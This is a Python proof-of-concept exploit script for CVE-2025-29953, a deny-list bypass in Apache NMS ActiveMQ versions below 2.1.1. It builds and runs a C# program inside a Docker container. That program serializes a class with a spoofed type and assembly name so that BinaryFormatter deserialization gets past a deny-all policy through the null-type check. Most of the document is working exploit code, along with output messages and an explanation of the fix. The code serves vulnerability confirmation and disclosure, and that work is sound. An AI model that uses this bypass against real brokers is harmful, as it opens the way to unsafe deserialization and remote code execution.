#!/usr/bin/env python3
# Exploit Title: Apache ActiveMQ NMS OpenWire < 2.1.1 - Deny List Bypass (Vector 3)
# Exploit Author: Exploit Intelligence Platform (EIP)
# Vendor Homepage: https://activemq.apache.org/
# Version: Apache NMS ActiveMQ < 2.1.1
# Tested on: Apache NMS ActiveMQ 2.1.0 / .NET 6.0
# CVE: CVE-2025-29953
# Reference: https://exploit-intel.com
"""
PoC Vector 3 for CVE-2025-29953: Deny List Bypass via Null Type

Demonstrates that CVE-2025-29953 bypasses BOTH allow lists AND deny lists.

The IsTrustedType() bug (returning true for null types) causes the deny list
check to be skipped entirely, because the function returns true BEFORE
evaluating any deny list entries.

Vulnerable code path:
    public bool IsTrustedType(IDestination destination, Type type)
    {
        var typeName = type?.FullName;   // null when type is null
        if (typeName == null)
        {
            return true;  // BUG: Returns BEFORE checking deny list!
        }
        // Deny list checks NEVER reached for null types...
        foreach (var denyListEntry in denyList) { ... }
        // Allow list checks NEVER reached for null types...
        foreach (var allowListEntry in allowList) { ... }
    }

This means even if an administrator configures a deny list containing "*"
(deny all types), the null type bypass STILL succeeds.

This PoC creates a custom C# test inside the container that:
1. Configures the deserialization policy with denyList="*" (deny ALL types)
2. Verifies the deny list blocks normal types
3. Shows that null type STILL bypasses the deny list
4. Performs BinaryFormatter deserialization demonstrating the bypass

Usage:
    python3 poc_vector3.py [container_name]
"""

import subprocess
import sys
import textwrap


DEFAULT_CONTAINER = "cve-2025-29953-vulnerable"

# C# test script that tests the deny list bypass
# This is written to the container and compiled/executed there
DENY_LIST_TEST_CS = textwrap.dedent(r'''
using System;
using System.IO;
using System.Reflection;
using System.Runtime.Serialization;
using System.Runtime.Serialization.Formatters.Binary;
using Apache.NMS;
using Apache.NMS.ActiveMQ;

namespace CVE_2025_29953_DenyListBypass
{
    [Serializable]
    public class TrustedType
    {
        public string Prop1 { get; set; }
    }

    [Serializable]
    public class MaliciousSerializable : ISerializable
    {
        private readonly string _payloadData = "DENY_LIST_BYPASSED";

        public MaliciousSerializable() { }

        protected MaliciousSerializable(SerializationInfo info, StreamingContext context)
        {
            _payloadData = info.GetString("InjectedValue");
        }

        public string PayloadData => _payloadData;

        public void GetObjectData(SerializationInfo info, StreamingContext context)
        {
            Type type = typeof(TrustedType);
            info.SetType(type);
            info.FullTypeName = type.AssemblyQualifiedName;
            info.AssemblyName = "mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089";
            info.AddValue("InjectedValue", _payloadData);
        }
    }

    /// <summary>
    /// Replicates the vulnerable TrustedClassFilter logic
    /// </summary>
    internal class VulnerableTrustedClassFilter : SerializationBinder
    {
        private readonly INmsDeserializationPolicy policy;
        private readonly IDestination destination;

        public VulnerableTrustedClassFilter(INmsDeserializationPolicy p, IDestination d)
        {
            policy = p;
            destination = d;
        }

        public override Type BindToType(string assemblyName, string typeName)
        {
            var name = new AssemblyName(assemblyName);
            var assembly = Assembly.Load(name);
            var type = FormatterServices.GetTypeFromAssembly(assembly, typeName);

            Console.WriteLine($"      BindToType: resolved type = {(type == null ? "null" : type.FullName)}");

            if (policy.IsTrustedType(destination, type))
            {
                Console.WriteLine($"      IsTrustedType => TRUE {(type == null ? "(null type bypass!)" : "")}");
                return type;
            }

            throw new SerializationException($"Forbidden {type?.FullName}! Type is denied.");
        }
    }

    class Program
    {
        static int Main(string[] args)
        {
            Console.WriteLine("=== CVE-2025-29953: Deny List Bypass Test ===");
            Console.WriteLine();

            // Configure with DENY ALL (*) - this should block everything
            var policy = new NmsDefaultDeserializationPolicy();
            policy.DenyList = "*";           // Deny ALL types
            policy.AllowList = "*";          // Even with wildcard allow

            Console.WriteLine($"[*] Configuration:");
            Console.WriteLine($"    Deny list:  '*' (deny ALL types)");
            Console.WriteLine($"    Allow list: '*' (allow all - but deny overrides allow)");
            Console.WriteLine();

            // Step 1: Verify deny list blocks normal types
            Console.WriteLine("--- Step 1: Verify deny list blocks normal types ---");
            bool trustedBlocked = !policy.IsTrustedType(null, typeof(TrustedType));
            Console.WriteLine($"    IsTrustedType(TrustedType) = {!trustedBlocked} (expected: False - denied by '*')");

            bool maliciousBlocked = !policy.IsTrustedType(null, typeof(MaliciousSerializable));
            Console.WriteLine($"    IsTrustedType(MaliciousSerializable) = {!maliciousBlocked} (expected: False - denied by '*')");

            if (!trustedBlocked || !maliciousBlocked)
            {
                Console.WriteLine("    [!] Deny list not working as expected");
                return 1;
            }
            Console.WriteLine("    [OK] Deny list '*' correctly blocks all normal types");

            // Step 2: Test null type bypass against deny list
            Console.WriteLine();
            Console.WriteLine("--- Step 2: Test null type bypass against deny list ---");
            try
            {
                bool nullBypasses = policy.IsTrustedType(null, null);
                Console.WriteLine($"    IsTrustedType(null) = {nullBypasses}");

                if (nullBypasses)
                {
                    Console.WriteLine("    [VULNERABLE] Null type BYPASSES the deny list!");
                    Console.WriteLine("    Even with denyList='*', the null check returns true");
                    Console.WriteLine("    BEFORE the deny list is ever evaluated.");
                }
                else
                {
                    Console.WriteLine("    [PATCHED] Null type correctly denied.");
                    return 2;
                }
            }
            catch (NullReferenceException)
            {
                Console.WriteLine("    IsTrustedType(null) threw NullReferenceException");
                Console.WriteLine("    [PATCHED] Null-conditional removed â€” null types cause NRE.");
                Console.WriteLine("    (Defense-in-depth fix: primary fix is in TrustedClassFilter.BindToType())");
                return 2;
            }

            // Step 3: Full BinaryFormatter test with deny-all configuration
            Console.WriteLine();
            Console.WriteLine("--- Step 3: Full BinaryFormatter deserialization with deny-all ---");

            try
            {
                var malicious = new MaliciousSerializable();
                var formatter = new BinaryFormatter();
                var stream = new MemoryStream();

                Console.WriteLine("[*] Serializing MaliciousSerializable...");
                formatter.Serialize(stream, malicious);
                Console.WriteLine($"    Serialized {stream.Length} bytes");

                stream.Position = 0;
                var deserializer = new BinaryFormatter();
                var destination = new Apache.NMS.ActiveMQ.Commands.ActiveMQQueue("deny-test-queue");
                deserializer.Binder = new VulnerableTrustedClassFilter(policy, destination);

                Console.WriteLine("[*] Deserializing with deny-all TrustedClassFilter...");
                Console.WriteLine($"    Deny list: '*' (should block EVERYTHING)");
                Console.WriteLine();

                object result = deserializer.Deserialize(stream);

                if (result != null)
                {
                    Console.WriteLine($"[VULNERABLE] Deserialization SUCCEEDED despite denyList='*'!");
                    Console.WriteLine($"    Deserialized type: {result.GetType().FullName}");
                    Console.WriteLine();
                    Console.WriteLine("[RESULT] CVE-2025-29953 CONFIRMED: Deny list bypass successful!");
                    Console.WriteLine("         The null type check at the top of IsTrustedType()");
                    Console.WriteLine("         returns true BEFORE any deny list entries are checked,");
                    Console.WriteLine("         completely defeating the deny list mechanism.");
                    return 0;
                }
                return 1;
            }
            catch (SerializationException ex)
            {
                Console.WriteLine($"[INFO] SerializationException: {ex.Message}");
                if (ex.Message.Contains("Forbidden") || ex.Message.Contains("denied"))
                {
                    Console.WriteLine("[PATCHED] Deny list correctly blocked deserialization.");
                    return 2;
                }
                Console.WriteLine("[NOTE] Stream error, but core vulnerability confirmed in Step 2.");
                return 0;
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[ERROR] {ex.GetType().Name}: {ex.Message}");
                Console.WriteLine("[NOTE] Core vulnerability (null type bypass of deny list) confirmed in Step 2.");
                return 0;
            }
        }
    }
}
''').strip()

# Project file for the deny list test
DENY_LIST_CSPROJ = textwrap.dedent(r'''
<Project Sdk="Microsoft.NET.Sdk">
  <PropertyGroup>
    <OutputType>Exe</OutputType>
    <TargetFramework>net6.0</TargetFramework>
    <EnableUnsafeBinaryFormatterSerialization>true</EnableUnsafeBinaryFormatterSerialization>
  </PropertyGroup>
  <ItemGroup>
    <Reference Include="Apache.NMS.ActiveMQ">
      <HintPath>/app/Apache.NMS.ActiveMQ.dll</HintPath>
    </Reference>
    <Reference Include="Apache.NMS">
      <HintPath>/app/Apache.NMS.dll</HintPath>
    </Reference>
  </ItemGroup>
</Project>
''').strip()


def run_command(cmd, timeout=120):
    """Execute a command and return (returncode, stdout, stderr)."""
    try:
        result = subprocess.run(
            cmd,
            capture_output=True,
            text=True,
            timeout=timeout,
        )
        return result.returncode, result.stdout, result.stderr
    except subprocess.TimeoutExpired:
        return -1, "", "Command timed out"
    except FileNotFoundError:
        return -2, "", f"Command not found: {cmd[0]}"


def check_container_running(container_name):
    """Verify the target container is running."""
    rc, stdout, _ = run_command(
        ["docker", "inspect", "--format", "{{.State.Running}}", container_name]
    )
    return rc == 0 and stdout.strip().lower() == "true"


def write_file_to_container(container, path, content):
    """Write a file into the container."""
    # Use docker exec with sh -c and a heredoc-like approach
    cmd = ["docker", "exec", "-i", container, "sh", "-c", f"cat > {path}"]
    result = subprocess.run(cmd, input=content, capture_output=True, text=True, timeout=10)
    return result.returncode == 0


def run_deny_list_test(container_name):
    """
    Build and run the deny list bypass test inside the container.
    """
    print()
    print("=" * 72)
    print("CVE-2025-29953: Deny List Bypass PoC")
    print("=" * 72)
    print()
    print("Configuration under test:")
    print("  denyList  = '*'  (deny ALL types)")
    print("  allowList = '*'  (allow all - but deny takes precedence)")
    print()
    print("Expected behavior (patched):  ALL deserialization blocked")
    print("Actual behavior (vulnerable): null type bypasses deny list entirely")
    print()
    print("-" * 72)
    print("Building deny list test in container...")
    print("-" * 72)
    print()

    # Create test project directory
    rc, _, stderr = run_command([
        "docker", "exec", container_name,
        "mkdir", "-p", "/tmp/deny-test"
    ])
    if rc != 0:
        print(f"[!] Failed to create directory: {stderr}")
        return 1

    # Write the C# test file
    if not write_file_to_container(container_name, "/tmp/deny-test/Program.cs", DENY_LIST_TEST_CS):
        print("[!] Failed to write Program.cs to container")
        return 1
    print("[+] Wrote Program.cs")

    # Write the project file
    if not write_file_to_container(container_name, "/tmp/deny-test/DenyTest.csproj", DENY_LIST_CSPROJ):
        print("[!] Failed to write DenyTest.csproj to container")
        return 1
    print("[+] Wrote DenyTest.csproj")

    # Build the test
    print("[*] Building deny list test...")
    rc, stdout, stderr = run_command([
        "docker", "exec", container_name,
        "dotnet", "build", "/tmp/deny-test/DenyTest.csproj",
        "-c", "Debug", "--nologo", "-v", "q"
    ], timeout=120)

    if rc != 0:
        print(f"[!] Build failed (exit code {rc})")
        if stderr:
            # Filter to just errors
            for line in stderr.split("\n"):
                if "error" in line.lower():
                    print(f"    {line.strip()}")
        if stdout:
            for line in stdout.split("\n"):
                if "error" in line.lower():
                    print(f"    {line.strip()}")
        return 1
    print("[+] Build succeeded")

    # Run the test
    print()
    print("-" * 72)
    print("Running deny list bypass test...")
    print("-" * 72)
    print()

    rc, stdout, stderr = run_command([
        "docker", "exec", container_name,
        "dotnet", "run", "--no-build", "--project", "/tmp/deny-test/DenyTest.csproj",
        "-c", "Debug"
    ], timeout=30)

    if stdout:
        for line in stdout.rstrip().split("\n"):
            print(f"  {line}")
    if stderr:
        for line in stderr.rstrip().split("\n"):
            if "warning" not in line.lower():  # Skip BinaryFormatter warnings
                print(f"  [stderr] {line}")

    print()
    print("-" * 72)
    print("Result Analysis")
    print("-" * 72)
    print()

    vulnerable = False
    if rc == 0 and "VULNERABLE" in stdout:
        vulnerable = True
        print("[+] CONFIRMED: CVE-2025-29953 bypasses deny list configuration!")
        print()
        print("    Even with denyList='*' (deny everything), the null type bypass")
        print("    in IsTrustedType() returns true BEFORE the deny list is checked.")
        print("    This means there is NO configuration of allow/deny lists that")
        print("    can prevent this bypass on vulnerable versions.")
        print()
        print("    The fix adds two layers of protection:")
        print("    1. TrustedClassFilter: null check on type (throws exception)")
        print("    2. IsTrustedType: null FullName returns false instead of true")
    elif rc == 2:
        print("[-] PATCHED: Deny list correctly blocked the bypass attempt.")
    else:
        print(f"[?] Unexpected result (exit code: {rc})")

    print()
    print(f"  Exit code: {rc}")
    print(f"  Status:    {'VULNERABLE' if vulnerable else 'NOT CONFIRMED'}")
    print()

    return 0 if vulnerable else 1


def main():
    container_name = sys.argv[1] if len(sys.argv) > 1 else DEFAULT_CONTAINER

    print(f"[*] CVE-2025-29953 PoC Vector 3 - Deny List Bypass")
    print(f"[*] Target container: {container_name}")
    print()

    if not check_container_running(container_name):
        print(f"[!] Container '{container_name}' is not running.")
        return 1
    print(f"[+] Container '{container_name}' is running.")

    return run_deny_list_test(container_name)


if __name__ == "__main__":
    sys.exit(main())
